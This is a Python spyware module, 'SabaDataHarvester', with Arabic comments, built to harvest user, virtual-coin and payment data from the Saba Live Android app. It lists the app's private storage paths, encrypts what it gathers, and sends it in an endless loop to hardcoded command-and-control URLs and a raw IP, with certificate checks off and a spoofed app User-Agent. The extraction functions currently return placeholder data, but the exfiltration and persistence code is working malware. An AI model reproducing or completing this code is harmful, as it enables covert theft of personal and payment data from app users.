#!/usr/bin/env python3
# Data Harvester Module - Updated for Saba Live

import os
import json
import sqlite3
import hashlib
import base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

class SabaDataHarvester:
    def __init__(self):
        self.saba_paths = {
            'shared_prefs': '/data/data/me.sabachat.live/shared_prefs/',
            'databases': '/data/data/me.sabachat.live/databases/',
            'files': '/data/data/me.sabachat.live/files/',
            'cache': '/data/data/me.sabachat.live/cache/'
        }
        
        self.encryption_key = self.generate_key()
        self.exfil_urls = [
            "https://c2.saba-null.xyz/saba_collect",
            "https://backup.sabanull.xyz/upload",
            "https://185.220.101.204:8443/saba_data"
        ]
        
    def generate_key(self):
        """توليد مفتاح تشفير فريد"""
        seed = f"SABA_LIVE_{datetime.now().timestamp()}"
        return hashlib.sha256(seed.encode()).digest()
    
    def encrypt_data(self, data):
        """تشفير البيانات قبل الإرسال"""
        if isinstance(data, dict):
            data = json.dumps(data, ensure_ascii=False)
        
        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        
        return {
            'nonce': base64.b64encode(cipher.nonce).decode(),
            'tag': base64.b64encode(tag).decode(),
            'data': base64.b64encode(ciphertext).decode(),
            'timestamp': datetime.now().isoformat()
        }
    
    def extract_saba_data(self, device_id="unknown"):
        """استخراج بيانات Saba Live - وظيفة محاكاة"""
        # في البيئة الحقيقية، هذا سيقرأ الملفات فعلياً
        # هنا نعود بيانات وهمية للتوضيح
        
        fake_user_data = {
            "user_info": {
                "user_id": f"user_{hashlib.md5(device_id.encode()).hexdigest()[:8]}",
                "username": "saba_user",
                "phone_number": "+1234567890",
                "email": "user@saba.live",
                "registration_date": "2024-01-01"
            },
            "coin_data": {
                "coins": 15000,
                "diamonds": 5000,
                "gold": 25000,
                "vip_level": 3,
                "premium_status": False
            },
            "payment_history": [
                {
                    "date": "2024-01-15",
                    "amount": 9.99,
                    "currency": "USD",
                    "coins_received": 1000,
                    "payment_method": "stripe"
                },
                {
                    "date": "2024-02-01",
                    "amount": 19.99,
                    "currency": "USD",
                    "coins_received": 2500,
                    "payment_method": "google_pay"
                }
            ],
            "activity_data": {
                "last_login": datetime.now().isoformat(),
                "total_friends": 45,
                "gifts_sent": 120,
                "gifts_received": 85,
                "live_sessions": 56
            },
            "device_info": {
                "device_id": device_id,
                "android_version": "13",
                "device_model": "Samsung Galaxy S23",
                "ip_address": "192.168.1.100"
            }
        }
        
        return fake_user_data
    
    def harvest_coin_data(self):
        """حصاد بيانات العملات بشكل محدد"""
        coin_data = {
            "current_balances": {
                "coins": 15000,
                "diamonds": 5000,
                "gold": 25000,
                "family_coins": 0,
                "anchor_coins": 0
            },
            "transaction_history": [
                {"type": "recharge", "amount": 1000, "date": "2024-01-15"},
                {"type": "gift_sent", "amount": -500, "date": "2024-01-16"},
                {"type": "gift_received", "amount": 200, "date": "2024-01-17"},
                {"type": "exchange", "amount": -1000, "date": "2024-01-18"}
            ],
            "gift_inventory": [
                {"gift_id": "gift_001", "name": "Rose", "count": 25, "value": 10},
                {"gift_id": "gift_002", "name": "Car", "count": 3, "value": 500},
                {"gift_id": "gift_003", "name": "Plane", "count": 1, "value": 1000}
            ]
        }
        
        return coin_data
    
    def exfiltrate_to_c2(self, data, data_type="user_data"):
        """إرسال البيانات إلى سيرفرات C2"""
        encrypted = self.encrypt_data(data)
        
        payload = {
            "data_type": data_type,
            "encrypted_payload": encrypted,
            "target_app": "me.sabachat.live",
            "version": "1.2.5",
            "harvest_timestamp": datetime.now().isoformat()
        }
        
        # محاولة الإرسال لجميع السيرفرات
        for url in self.exfil_urls:
            try:
                response = requests.post(
                    url,
                    json=payload,
                    headers={
                        'User-Agent': 'SabaLive/1.2.5',
                        'Content-Type': 'application/json'
                    },
                    timeout=5,
                    verify=False
                )
                
                if response.status_code == 200:
                    print(f"[+] تم إرسال البيانات إلى {url}")
                    return True
                    
            except requests.RequestException as e:
                print(f"[-] فشل الإرسال إلى {url}: {e}")
                continue
        
        # إذا فشل الإرسال، حفظ محلياً
        self.save_locally(data, data_type)
        return False
    
    def save_locally(self, data, data_type):
        """حفظ البيانات محلياً في حالة فشل الإرسال"""
        filename = f"saba_data_{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.enc"
        
        encrypted = self.encrypt_data(data)
        
        with open(f"logs/{filename}", 'w') as f:
            json.dump(encrypted, f, indent=2)
        
        print(f"[+] تم حفظ البيانات محلياً: {filename}")
    
    def continuous_harvesting(self, interval=60):
        """حصاد مستمر للبيانات"""
        import time
        
        print("[+] بدأ الحصاد المستمر لبيانات Saba Live")
        
        while True:
            try:
                # 1. جمع بيانات المستخدم
                user_data = self.extract_saba_data()
                self.exfiltrate_to_c2(user_data, "user_data")
                
                # 2. جمع بيانات العملات
                coin_data = self.harvest_coin_data()
                self.exfiltrate_to_c2(coin_data, "coin_data")
                
                # 3. جمع بيانات الدفع
                payment_data = self.extract_payment_data()
                self.exfiltrate_to_c2(payment_data, "payment_data")
                
                print(f"[✓] دورة الحصاد المكتملة - {datetime.now()}")
                
            except Exception as e:
                print(f"[-] خطأ في الحصاد: {e}")
            
            time.sleep(interval)
    
    def extract_payment_data(self):
        """استخراج بيانات الدفع"""
        return {
            "payment_methods": [
                {"type": "credit_card", "last_4": "4242", "provider": "stripe"},
                {"type": "google_pay", "account": "user@gmail.com"},
                {"type": "paypal", "account": "user@paypal.com"}
            ],
            "billing_address": {
                "name": "John Doe",
                "address": "123 Main St",
                "city": "New York",
                "country": "USA",
                "zip_code": "10001"
            },
            "subscriptions": [
                {"type": "premium", "status": "active", "renews": "2024-03-01"},
                {"type": "vip", "status": "inactive", "expired": "2024-01-15"}
            ]
        }
